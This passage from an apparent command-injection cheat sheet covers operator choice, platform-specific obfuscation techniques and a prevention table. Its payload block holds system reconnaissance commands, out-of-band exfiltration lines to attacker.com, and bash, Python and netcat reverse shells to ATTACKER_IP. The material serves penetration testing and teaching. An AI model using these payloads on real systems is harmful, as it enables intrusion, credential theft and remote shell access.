    ├── Use sleep 5 (check response time)
    └── Use DNS callback (nslookup, curl to your server)

Is the first command likely to succeed?
├── YES → Use && or ; or \n
└── NO / uncertain → Use || (executes second only if first fails)
```

### Platform Compatibility Reference

|Technique|Linux Bash|Windows CMD|Windows PS|
|---|---|---|---|
|`;` operator|✅|❌|✅|
|`\n` `%0a` operator|✅|✅|✅|
|`&` operator|✅|✅|✅|
|`\|` operator|✅|✅|✅|
|`&&` operator|✅|✅|✅|
|`\|` operator|✅|✅|✅|
|`$()` sub-shell|✅|❌|✅|
|Backtick sub-shell|✅|❌|❌|
|`$IFS` / `${IFS}`|✅|❌|❌|
|`${VAR:pos:len}`|✅|❌|❌ (use `$env:VAR[n]`)|
|`{cmd,arg}` brace expansion|✅|❌|❌|
|Single quotes in command|✅|✅|✅|
|Double quotes in command|✅|✅|✅|
|`\` in command name|✅|❌|❌|
|`$@` in command name|✅|❌|❌|
|`^` in command name|❌|✅|❌|
|`tr` case conversion|✅|❌|❌|
|`rev` reversal|✅|❌|❌|
|`-join ''` reversal|❌|❌|✅|
|base64 decode|✅|❌|✅|
|`-EncodedCommand`|❌|❌|✅|

### Common Useful Payloads

```bash
# --- RECONNAISSANCE ---
# Who am I running as?
whoami
id

# What OS and version?
uname -a                     # Linux
ver                          # Windows CMD
$PSVersionTable.PSVersion    # PowerShell

# What directory am I in?
pwd
cd                           # Windows

# List directory
ls -la
dir /a                       # Windows

# Find interesting files
find / -name "flag*" 2>/dev/null
find / -name "*.txt" -readable 2>/dev/null
find / -perm -4000 2>/dev/null        # SUID files

# Read files
cat /etc/passwd
type C:\Windows\System32\drivers\etc\hosts   # Windows

# Network info
ifconfig
ip a
ipconfig /all                # Windows

# --- OUT-OF-BAND VERIFICATION ---
# Prove execution via DNS
nslookup $(whoami).attacker.com
dig $(whoami).attacker.com @attacker.com

# Prove execution via HTTP
curl http://attacker.com/$(whoami)
wget -q -O /dev/null http://attacker.com/$(id)

# --- REVERSE SHELLS (when you have full command execution) ---
# Bash
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1

# Python
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# nc (if -e is available)
nc -e /bin/bash ATTACKER_IP 4444

# nc (without -e)
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP 4444 >/tmp/f
```

### Prevention Quick Reference

|Layer|Control|Implementation|
|---|---|---|
|**Code**|Avoid OS command functions|Use language built-ins instead of `system()` / `exec()`|
|**Code**|Allowlist validation|Regex/type-based validation before any processing|
|**Code**|Input sanitisation|`escapeshellarg()`, `DOMPurify`, parameterised execution|
|**Code**|Parameterised execution|Pass args as list to `subprocess.run()`, not shell string|
|**Server**|Disable dangerous PHP functions|`disable_functions=system,exec,shell_exec,...`|
|**Server**|Restrict file path access|`open_basedir=/var/www/html`|
|**Server**|Least privilege|Web server runs as low-privilege dedicated user|
|**Network**|WAF|`mod_security`, Cloudflare, AWS WAF with OWASP ruleset|
|**Network**|Block non-ASCII in URLs|Nginx/Apache config — reject unexpected character classes|
